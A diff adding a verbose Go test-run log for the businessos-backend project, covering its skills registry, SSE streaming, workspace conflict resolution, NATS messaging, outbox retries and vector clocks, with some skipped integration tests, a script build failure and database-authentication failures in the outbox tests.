+=== RUN   TestRegistry_Unregister
+2026/01/27 10:20:48 INFO skill registered name=unregister_test description="Test unregister"
+2026/01/27 10:20:48 INFO skill unregistered name=unregister_test
+--- PASS: TestRegistry_Unregister (0.00s)
+=== RUN   TestRegistry_Count
+2026/01/27 10:20:48 INFO skill registered name=skill0 description="Skill 0"
+2026/01/27 10:20:48 INFO skill registered name=skill1 description="Skill 1"
+2026/01/27 10:20:48 INFO skill registered name=skill2 description="Skill 2"
+2026/01/27 10:20:48 INFO skill registered name=skill3 description="Skill 3"
+2026/01/27 10:20:48 INFO skill registered name=skill4 description="Skill 4"
+--- PASS: TestRegistry_Count (0.00s)
+=== RUN   TestRegistry_Concurrency
+2026/01/27 10:20:48 INFO skill registered name=concurrent_1 description="Concurrent skill 1"
+2026/01/27 10:20:48 INFO skill registered name=concurrent_9 description="Concurrent skill 9"
+2026/01/27 10:20:48 INFO skill registered name=concurrent_0 description="Concurrent skill 0"
+2026/01/27 10:20:48 INFO skill registered name=concurrent_2 description="Concurrent skill 2"
+2026/01/27 10:20:48 INFO skill registered name=concurrent_3 description="Concurrent skill 3"
+2026/01/27 10:20:48 INFO skill registered name=concurrent_4 description="Concurrent skill 4"
+2026/01/27 10:20:48 INFO skill registered name=concurrent_5 description="Concurrent skill 5"
+2026/01/27 10:20:48 INFO skill registered name=concurrent_6 description="Concurrent skill 6"
+2026/01/27 10:20:48 INFO skill registered name=concurrent_7 description="Concurrent skill 7"
+2026/01/27 10:20:48 INFO skill registered name=concurrent_8 description="Concurrent skill 8"
+--- PASS: TestRegistry_Concurrency (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/services/skills	(cached)
+?   	github.com/rhl/businessos-backend/internal/services/templates	[no test files]
+FAIL	github.com/rhl/businessos-backend/internal/sorx [build failed]
+=== RUN   TestSSEWriterBasicFunctionality
+--- PASS: TestSSEWriterBasicFunctionality (0.00s)
+=== RUN   TestSSEWriterMultipleEvents
+--- PASS: TestSSEWriterMultipleEvents (0.00s)
+=== RUN   TestSSEWriterSpecialCharacters
+=== RUN   TestSSEWriterSpecialCharacters/Unicode
+=== RUN   TestSSEWriterSpecialCharacters/Newlines
+=== RUN   TestSSEWriterSpecialCharacters/Quotes
+=== RUN   TestSSEWriterSpecialCharacters/Backslashes
+=== RUN   TestSSEWriterSpecialCharacters/JSON_content
+=== RUN   TestSSEWriterSpecialCharacters/HTML_content
+=== RUN   TestSSEWriterSpecialCharacters/Code_snippet
+--- PASS: TestSSEWriterSpecialCharacters (0.00s)
+    --- PASS: TestSSEWriterSpecialCharacters/Unicode (0.00s)
+    --- PASS: TestSSEWriterSpecialCharacters/Newlines (0.00s)
+    --- PASS: TestSSEWriterSpecialCharacters/Quotes (0.00s)
+    --- PASS: TestSSEWriterSpecialCharacters/Backslashes (0.00s)
+    --- PASS: TestSSEWriterSpecialCharacters/JSON_content (0.00s)
+    --- PASS: TestSSEWriterSpecialCharacters/HTML_content (0.00s)
+    --- PASS: TestSSEWriterSpecialCharacters/Code_snippet (0.00s)
+=== RUN   TestStreamProcessorArtifactDetection
+=== RUN   TestStreamProcessorArtifactDetection/Plain_text
+    sse_reliability_test.go:156: Output for Plain text: event: token
+        data: {"type":"token","content":"Hello World"}
+        
+=== RUN   TestStreamProcessorArtifactDetection/Complete_artifact
+    sse_reliability_test.go:156: Output for Complete artifact: event: token
+        data: {"type":"token","content":"\u003cartifac"}
+        
+        event: token
+        data: {"type":"token","c
+--- PASS: TestStreamProcessorArtifactDetection (0.00s)
+    --- PASS: TestStreamProcessorArtifactDetection/Plain_text (0.00s)
+    --- PASS: TestStreamProcessorArtifactDetection/Complete_artifact (0.00s)
+=== RUN   TestSSEWriterConcurrency
+    sse_reliability_test.go:196: Wrote 1000 events concurrently
+--- PASS: TestSSEWriterConcurrency (0.00s)
+=== RUN   TestSSEWriterLargePayload
+=== RUN   TestSSEWriterLargePayload/1KB
+    sse_reliability_test.go:228: Wrote 1024 bytes in 0s
+=== RUN   TestSSEWriterLargePayload/:KB
+    sse_reliability_test.go:228: Wrote 10240 bytes in 0s
+=== RUN   TestSSEWriterLargePayload/\u0094KB
+    sse_reliability_test.go:228: Wrote 102400 bytes in 558Âµs
+--- PASS: TestSSEWriterLargePayload (0.00s)
+    --- PASS: TestSSEWriterLargePayload/1KB (0.00s)
+    --- PASS: TestSSEWriterLargePayload/:KB (0.00s)
+    --- PASS: TestSSEWriterLargePayload/\u0094KB (0.00s)
+=== RUN   TestSSEWriterContextCancellation
+--- PASS: TestSSEWriterContextCancellation (0.00s)
+=== RUN   TestSSEWriterErrorRecovery
+--- PASS: TestSSEWriterErrorRecovery (0.00s)
+=== RUN   TestStreamProcessorFlushBehavior
+    sse_reliability_test.go:311: Before flush: 0 chars, After flush: 61 chars
+--- PASS: TestStreamProcessorFlushBehavior (0.00s)
+=== RUN   TestSSEEventTypes
+=== RUN   TestSSEEventTypes/token
+=== RUN   TestSSEEventTypes/thinking
+=== RUN   TestSSEEventTypes/thinking_start
+=== RUN   TestSSEEventTypes/thinking_chunk
+=== RUN   TestSSEEventTypes/thinking_end
+=== RUN   TestSSEEventTypes/artifact_start
+=== RUN   TestSSEEventTypes/artifact_complete
+=== RUN   TestSSEEventTypes/artifact_error
+=== RUN   TestSSEEventTypes/tool_call
+=== RUN   TestSSEEventTypes/tool_result
+=== RUN   TestSSEEventTypes/content_start
+=== RUN   TestSSEEventTypes/content_end
+=== RUN   TestSSEEventTypes/delegating
+=== RUN   TestSSEEventTypes/done
+=== RUN   TestSSEEventTypes/error
+--- PASS: TestSSEEventTypes (0.00s)
+    --- PASS: TestSSEEventTypes/token (0.00s)
+    --- PASS: TestSSEEventTypes/thinking (0.00s)
+    --- PASS: TestSSEEventTypes/thinking_start (0.00s)
+    --- PASS: TestSSEEventTypes/thinking_chunk (0.00s)
+    --- PASS: TestSSEEventTypes/thinking_end (0.00s)
+    --- PASS: TestSSEEventTypes/artifact_start (0.00s)
+    --- PASS: TestSSEEventTypes/artifact_complete (0.00s)
+    --- PASS: TestSSEEventTypes/artifact_error (0.00s)
+    --- PASS: TestSSEEventTypes/tool_call (0.00s)
+    --- PASS: TestSSEEventTypes/tool_result (0.00s)
+    --- PASS: TestSSEEventTypes/content_start (0.00s)
+    --- PASS: TestSSEEventTypes/content_end (0.00s)
+    --- PASS: TestSSEEventTypes/delegating (0.00s)
+    --- PASS: TestSSEEventTypes/done (0.00s)
+    --- PASS: TestSSEEventTypes/error (0.00s)
+=== RUN   TestEventTypeConstants
+--- PASS: TestEventTypeConstants (0.00s)
+=== RUN   TestStreamEventJSON
+--- PASS: TestStreamEventJSON (0.00s)
+=== RUN   TestStreamEventWithData
+--- PASS: TestStreamEventWithData (0.00s)
+=== RUN   TestThinkingStepJSON
+--- PASS: TestThinkingStepJSON (0.00s)
+=== RUN   TestToolCallEventJSON
+--- PASS: TestToolCallEventJSON (0.00s)
+=== RUN   TestArtifactJSON
+--- PASS: TestArtifactJSON (0.00s)
+=== RUN   TestNewArtifactDetector
+--- PASS: TestNewArtifactDetector (0.00s)
+=== RUN   TestArtifactDetectorSimpleText
+--- PASS: TestArtifactDetectorSimpleText (0.00s)
+=== RUN   TestArtifactDetectorArtifactStart
+--- PASS: TestArtifactDetectorArtifactStart (0.00s)
+=== RUN   TestArtifactDetectorCompleteArtifact
+--- PASS: TestArtifactDetectorCompleteArtifact (0.00s)
+=== RUN   TestArtifactDetectorInvalidJSON
+--- PASS: TestArtifactDetectorInvalidJSON (0.00s)
+=== RUN   TestArtifactDetectorUnclosedArtifact
+--- PASS: TestArtifactDetectorUnclosedArtifact (0.00s)
+=== RUN   TestArtifactDetectorReset
+--- PASS: TestArtifactDetectorReset (0.00s)
+=== RUN   TestArtifactDetectorChunkedInput
+--- PASS: TestArtifactDetectorChunkedInput (0.00s)
+=== RUN   TestNewSSEWriter
+--- PASS: TestNewSSEWriter (0.00s)
+=== RUN   TestSSEWriterWriteEvent
+--- PASS: TestSSEWriterWriteEvent (0.00s)
+=== RUN   TestSSEWriterWriteToken
+--- PASS: TestSSEWriterWriteToken (0.00s)
+=== RUN   TestSSEWriterWriteRaw
+--- PASS: TestSSEWriterWriteRaw (0.00s)
+=== RUN   TestSSEWriterSSEFormat
+--- PASS: TestSSEWriterSSEFormat (0.00s)
+=== RUN   TestNewStreamProcessor
+--- PASS: TestNewStreamProcessor (0.00s)
+=== RUN   TestStreamProcessorProcessChunk
+--- PASS: TestStreamProcessorProcessChunk (0.00s)
+=== RUN   TestStreamProcessorWithArtifact
+--- PASS: TestStreamProcessorWithArtifact (0.00s)
+=== RUN   TestStreamProcessorWriteRaw
+--- PASS: TestStreamProcessorWriteRaw (0.00s)
+=== RUN   TestStreamProcessorIsInArtifact
+--- PASS: TestStreamProcessorIsInArtifact (0.00s)
+=== RUN   TestEmptyInput
+--- PASS: TestEmptyInput (0.00s)
+=== RUN   TestMultipleArtifacts
+--- PASS: TestMultipleArtifacts (0.00s)
+=== RUN   TestSpecialCharactersInContent
+--- PASS: TestSpecialCharactersInContent (0.00s)
+=== RUN   TestUnicodeContent
+--- PASS: TestUnicodeContent (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/streaming	(cached)
+# github.com/rhl/businessos-backend/scripts
+scripts\run_live_tests.go:47:6: main redeclared in this block
+	scripts\oauth_setup_helper.go:30:6: other declaration of main
+# github.com/rhl/businessos-backend/scripts/tests
+scripts\tests\check_workspace_schema.go:13:6: main redeclared in this block
+	scripts\tests\check_categories.go:13:6: other declaration of main
+scripts\tests\run_osa_worker_exec.go:30:6: main redeclared in this block
+	scripts\tests\check_categories.go:13:6: other declaration of main
+scripts\tests\setup_test_workspace.go:14:6: main redeclared in this block
+	scripts\tests\check_categories.go:13:6: other declaration of main
+scripts\tests\test_db_connection.go:14:6: main redeclared in this block
+	scripts\tests\check_categories.go:13:6: other declaration of main
+scripts\tests\test_version_control.go:69:6: main redeclared in this block
+	scripts\tests\check_categories.go:13:6: other declaration of main
+=== RUN   TestDetectWorkspaceConflict_NoConflict_RemoteClearlyNewer
+--- PASS: TestDetectWorkspaceConflict_NoConflict_RemoteClearlyNewer (0.00s)
+=== RUN   TestDetectWorkspaceConflict_NoConflict_LocalClearlyNewer
+--- PASS: TestDetectWorkspaceConflict_NoConflict_LocalClearlyNewer (0.00s)
+=== RUN   TestDetectWorkspaceConflict_NoConflict_IdenticalData
+--- PASS: TestDetectWorkspaceConflict_NoConflict_IdenticalData (0.00s)
+=== RUN   TestDetectWorkspaceConflict_ConflictDetected_NameChanged
+--- PASS: TestDetectWorkspaceConflict_ConflictDetected_NameChanged (0.01s)
+=== RUN   TestDetectWorkspaceConflict_ConflictDetected_MultipleFields
+--- PASS: TestDetectWorkspaceConflict_ConflictDetected_MultipleFields (0.00s)
+=== RUN   TestResolveConflict_TimestampBased_RemoteWins
+--- PASS: TestResolveConflict_TimestampBased_RemoteWins (0.00s)
+=== RUN   TestResolveConflict_TimestampBased_LocalWins
+--- PASS: TestResolveConflict_TimestampBased_LocalWins (0.00s)
+=== RUN   TestResolveConflict_FieldLevelMerge_NonCriticalFields
+--- PASS: TestResolveConflict_FieldLevelMerge_NonCriticalFields (0.00s)
+=== RUN   TestResolveConflict_ManualReview_CriticalFields
+--- PASS: TestResolveConflict_ManualReview_CriticalFields (0.00s)
+=== RUN   TestCanAutoMerge
+=== RUN   TestCanAutoMerge/only_non-critical_fields
+=== RUN   TestCanAutoMerge/contains_name_(critical)
+=== RUN   TestCanAutoMerge/contains_mode_(critical)
+=== RUN   TestCanAutoMerge/both_critical_fields
+--- PASS: TestCanAutoMerge (0.00s)
+    --- PASS: TestCanAutoMerge/only_non-critical_fields (0.00s)
+    --- PASS: TestCanAutoMerge/contains_name_(critical) (0.00s)
+    --- PASS: TestCanAutoMerge/contains_mode_(critical) (0.00s)
+    --- PASS: TestCanAutoMerge/both_critical_fields (0.00s)
+=== RUN   TestMergeJSON
+--- PASS: TestMergeJSON (0.00s)
+=== RUN   TestMergeUUIDSlices
+--- PASS: TestMergeUUIDSlices (0.00s)
+=== RUN   TestJSONEqual
+=== RUN   TestJSONEqual/identical_objects
+=== RUN   TestJSONEqual/same_content_different_order
+=== RUN   TestJSONEqual/different_values
+=== RUN   TestJSONEqual/empty_objects
+=== RUN   TestJSONEqual/both_nil/empty
+--- PASS: TestJSONEqual (0.00s)
+    --- PASS: TestJSONEqual/identical_objects (0.00s)
+    --- PASS: TestJSONEqual/same_content_different_order (0.00s)
+    --- PASS: TestJSONEqual/different_values (0.00s)
+    --- PASS: TestJSONEqual/empty_objects (0.00s)
+    --- PASS: TestJSONEqual/both_nil/empty (0.00s)
+=== RUN   TestUUIDSliceEqual
+=== RUN   TestUUIDSliceEqual/identical_slices
+=== RUN   TestUUIDSliceEqual/same_IDs_different_order
+=== RUN   TestUUIDSliceEqual/different_IDs
+=== RUN   TestUUIDSliceEqual/different_lengths
+=== RUN   TestUUIDSliceEqual/both_empty
+--- PASS: TestUUIDSliceEqual (0.00s)
+    --- PASS: TestUUIDSliceEqual/identical_slices (0.00s)
+    --- PASS: TestUUIDSliceEqual/same_IDs_different_order (0.00s)
+    --- PASS: TestUUIDSliceEqual/different_IDs (0.00s)
+    --- PASS: TestUUIDSliceEqual/different_lengths (0.00s)
+    --- PASS: TestUUIDSliceEqual/both_empty (0.00s)
+=== RUN   TestNewNATSClient_Disabled
+time=2026-01-27T13:27:46.021-03:00 level=INFO msg="NATS client disabled, operating in standalone mode"
+--- PASS: TestNewNATSClient_Disabled (0.00s)
+=== RUN   TestNewNATSClient_DefaultConfig
+time=2026-01-27T13:27:46.022-03:00 level=INFO msg="NATS client disabled, operating in standalone mode"
+--- PASS: TestNewNATSClient_DefaultConfig (0.00s)
+=== RUN   TestNATSClient_PublishSync_Disabled
+time=2026-01-27T13:27:46.022-03:00 level=INFO msg="NATS client disabled, operating in standalone mode"
+time=2026-01-27T13:27:46.022-03:00 level=DEBUG msg="NATS disabled, skipping publish" subject=test.subject
+--- PASS: TestNATSClient_PublishSync_Disabled (0.00s)
+=== RUN   TestNATSClient_Subscribe_Disabled
+time=2026-01-27T13:27:46.022-03:00 level=INFO msg="NATS client disabled, operating in standalone mode"
+time=2026-01-27T13:27:46.022-03:00 level=DEBUG msg="NATS disabled, skipping subscribe" subject=test.subject
+--- PASS: TestNATSClient_Subscribe_Disabled (0.00s)
+=== RUN   TestNATSClient_Integration_Connect
+    nats_client_test.go:100: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_Integration_Connect (0.00s)
+=== RUN   TestNATSClient_Integration_PublishSubscribe
+    nats_client_test.go:100: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_Integration_PublishSubscribe (0.00s)
+=== RUN   TestNATSClient_Integration_WorkspaceEvents
+    nats_client_test.go:100: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_Integration_WorkspaceEvents (0.00s)
+=== RUN   TestNATSClient_Integration_ConflictEvents
+    nats_client_test.go:100: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_Integration_ConflictEvents (0.00s)
+=== RUN   TestNATSClient_Integration_MultipleSubscriptions
+    nats_client_test.go:100: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_Integration_MultipleSubscriptions (0.00s)
+=== RUN   TestNATSClient_Integration_Unsubscribe
+    nats_client_test.go:100: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_Integration_Unsubscribe (0.00s)
+=== RUN   TestNATSClient_Integration_Stats
+    nats_client_test.go:100: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_Integration_Stats (0.00s)
+=== RUN   TestNATSClient_Close_Multiple
+time=2026-01-27T13:27:46.022-03:00 level=INFO msg="NATS client disabled, operating in standalone mode"
+--- PASS: TestNATSClient_Close_Multiple (0.00s)
+=== RUN   TestSyncEvent_Marshal
+--- PASS: TestSyncEvent_Marshal (0.00s)
+=== RUN   TestConflictEvent_Marshal
+--- PASS: TestConflictEvent_Marshal (0.00s)
+=== RUN   TestNewOutboxProcessor
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:24
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:52
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestNewOutboxProcessor
+        	Messages:   	Failed to setup test database
+--- FAIL: TestNewOutboxProcessor (0.04s)
+=== RUN   TestRetrySchedule
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:24
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:63
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestRetrySchedule
+        	Messages:   	Failed to setup test database
+--- FAIL: TestRetrySchedule (0.03s)
+=== RUN   TestProcessUserEvent
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:24
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:79
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestProcessUserEvent
+        	Messages:   	Failed to setup test database
+--- FAIL: TestProcessUserEvent (0.04s)
+=== RUN   TestProcessEventRetry
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:24
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:122
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestProcessEventRetry
+        	Messages:   	Failed to setup test database
+--- FAIL: TestProcessEventRetry (0.03s)
+=== RUN   TestHandleProcessingErrorWithRetry
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:24
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:163
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestHandleProcessingErrorWithRetry
+        	Messages:   	Failed to setup test database
+--- FAIL: TestHandleProcessingErrorWithRetry (0.03s)
+=== RUN   TestHandleProcessingErrorMaxRetries
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:24
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:210
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestHandleProcessingErrorMaxRetries
+        	Messages:   	Failed to setup test database
+--- FAIL: TestHandleProcessingErrorMaxRetries (0.13s)
+=== RUN   TestGetStats
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:24
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:265
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestGetStats
+        	Messages:   	Failed to setup test database
+--- FAIL: TestGetStats (0.03s)
+=== RUN   TestStartStop
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:24
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:321
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestStartStop
+        	Messages:   	Failed to setup test database
+--- FAIL: TestStartStop (0.03s)
+=== RUN   TestConcurrentProcessing
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:24
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/sync/outbox_processor_test.go:345
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestConcurrentProcessing
+        	Messages:   	Failed to setup test database
+--- FAIL: TestConcurrentProcessing (0.03s)
+FAIL
+FAIL	github.com/rhl/businessos-backend/internal/sync	0.571s
+?   	github.com/rhl/businessos-backend/internal/sync/conflicts	[no test files]
+=== RUN   TestNATSClient_Connection
+    nats_client_test.go:21: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_Connection (0.00s)
+=== RUN   TestNATSClient_CreateStreams
+    nats_client_test.go:44: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_CreateStreams (0.00s)
+=== RUN   TestNATSClient_PublishSubscribe
+    nats_client_test.go:68: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_PublishSubscribe (0.00s)
+=== RUN   TestNATSClient_Idempotency
+    nats_client_test.go:153: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_Idempotency (0.00s)
+=== RUN   TestNATSClient_WorkspaceEvents
+    nats_client_test.go:188: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_WorkspaceEvents (0.00s)
+=== RUN   TestNATSClient_BuildEvents
+    nats_client_test.go:257: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_BuildEvents (0.00s)
+=== RUN   TestNATSClient_ErrorHandling
+time=2026-01-27T10:20:38.084-03:00 level=INFO msg="connecting to NATS" url=nats://invalid:4222
+--- PASS: TestNATSClient_ErrorHandling (9.06s)
+=== RUN   TestNATSClient_Close
+    nats_client_test.go:348: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_Close (0.00s)
+=== RUN   TestNATSClient_Stats
+    nats_client_test.go:390: NATS_URL not set, skipping integration test
+--- SKIP: TestNATSClient_Stats (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/sync/messaging	(cached)
+=== RUN   TestGetMetrics
+--- PASS: TestGetMetrics (0.00s)
+=== RUN   TestPendingEventsCounter
+--- PASS: TestPendingEventsCounter (0.00s)
+=== RUN   TestProcessingEventsCounter
+--- PASS: TestProcessingEventsCounter (0.00s)
+=== RUN   TestCompletedEventsCounter
+--- PASS: TestCompletedEventsCounter (0.00s)
+=== RUN   TestFailedEventsCounter
+--- PASS: TestFailedEventsCounter (0.00s)
+=== RUN   TestProcessingDuration
+--- PASS: TestProcessingDuration (0.00s)
+=== RUN   TestProcessingDurationSlidingWindow
+--- PASS: TestProcessingDurationSlidingWindow (0.00s)
+=== RUN   TestErrorCounter
+--- PASS: TestErrorCounter (0.00s)
+=== RUN   TestConflictCounter
+--- PASS: TestConflictCounter (0.00s)
+=== RUN   TestGetSnapshot
+--- PASS: TestGetSnapshot (0.00s)
+=== RUN   TestReset
+--- PASS: TestReset (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/sync/metrics	(cached)
+=== RUN   TestDefaultProcessorConfig
+--- PASS: TestDefaultProcessorConfig (0.00s)
+=== RUN   TestCalculateBackoff
+=== RUN   TestCalculateBackoff/Attempt_0:_Immediate
+=== RUN   TestCalculateBackoff/Attempt_1:_1s_Â±_25%
+=== RUN   TestCalculateBackoff/Attempt_2:_2s_Â±_25%
+=== RUN   TestCalculateBackoff/Attempt_3:_4s_Â±_25%
+=== RUN   TestCalculateBackoff/Attempt_4:_8s_Â±_25%
+=== RUN   TestCalculateBackoff/Attempt_5:_16s_Â±_25%
+--- PASS: TestCalculateBackoff (0.00s)
+    --- PASS: TestCalculateBackoff/Attempt_0:_Immediate (0.00s)
+    --- PASS: TestCalculateBackoff/Attempt_1:_1s_Â±_25% (0.00s)
+    --- PASS: TestCalculateBackoff/Attempt_2:_2s_Â±_25% (0.00s)
+    --- PASS: TestCalculateBackoff/Attempt_3:_4s_Â±_25% (0.00s)
+    --- PASS: TestCalculateBackoff/Attempt_4:_8s_Â±_25% (0.00s)
+    --- PASS: TestCalculateBackoff/Attempt_5:_16s_Â±_25% (0.00s)
+=== RUN   TestCalculateBackoff_MaxCap
+--- PASS: TestCalculateBackoff_MaxCap (0.00s)
+=== RUN   TestPublishToNATS_SubjectFormat
+=== RUN   TestPublishToNATS_SubjectFormat/businessos.user.created
+=== RUN   TestPublishToNATS_SubjectFormat/businessos.workspace.updated
+=== RUN   TestPublishToNATS_SubjectFormat/businessos.app.deleted
+--- PASS: TestPublishToNATS_SubjectFormat (0.06s)
+    --- PASS: TestPublishToNATS_SubjectFormat/businessos.user.created (0.06s)
+    --- PASS: TestPublishToNATS_SubjectFormat/businessos.workspace.updated (0.00s)
+    --- PASS: TestPublishToNATS_SubjectFormat/businessos.app.deleted (0.00s)
+=== RUN   TestPublishToNATS_Timeout
+--- PASS: TestPublishToNATS_Timeout (5.00s)
+=== RUN   TestProcessorConfig_Validation
+=== RUN   TestProcessorConfig_Validation/Valid_default_config
+=== RUN   TestProcessorConfig_Validation/Custom_valid_config
+--- PASS: TestProcessorConfig_Validation (0.00s)
+    --- PASS: TestProcessorConfig_Validation/Valid_default_config (0.00s)
+    --- PASS: TestProcessorConfig_Validation/Custom_valid_config (0.00s)
+=== RUN   TestProcessorRetrySequence
+--- PASS: TestProcessorRetrySequence (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/sync/outbox	(cached)
+=== RUN   TestNew
+--- PASS: TestNew (0.00s)
+=== RUN   TestIncrement
+--- PASS: TestIncrement (0.00s)
+=== RUN   TestGet
+--- PASS: TestGet (0.00s)
+=== RUN   TestMerge
+--- PASS: TestMerge (0.00s)
+=== RUN   TestCompare
+=== RUN   TestCompare/clock1_before_clock2
+=== RUN   TestCompare/clock1_after_clock2
+=== RUN   TestCompare/concurrent_clocks
+=== RUN   TestCompare/equal_clocks
+=== RUN   TestCompare/empty_clocks
+=== RUN   TestCompare/one_empty_clock
+--- PASS: TestCompare (0.00s)
+    --- PASS: TestCompare/clock1_before_clock2 (0.00s)
+    --- PASS: TestCompare/clock1_after_clock2 (0.00s)
+    --- PASS: TestCompare/concurrent_clocks (0.00s)
+    --- PASS: TestCompare/equal_clocks (0.00s)
+    --- PASS: TestCompare/empty_clocks (0.00s)
+    --- PASS: TestCompare/one_empty_clock (0.00s)
+=== RUN   TestIsBefore
+--- PASS: TestIsBefore (0.00s)
+=== RUN   TestIsAfter
+--- PASS: TestIsAfter (0.00s)
+=== RUN   TestIsConcurrent
+--- PASS: TestIsConcurrent (0.00s)
+=== RUN   TestFromMap
+--- PASS: TestFromMap (0.00s)
+=== RUN   TestToMap
+--- PASS: TestToMap (0.00s)
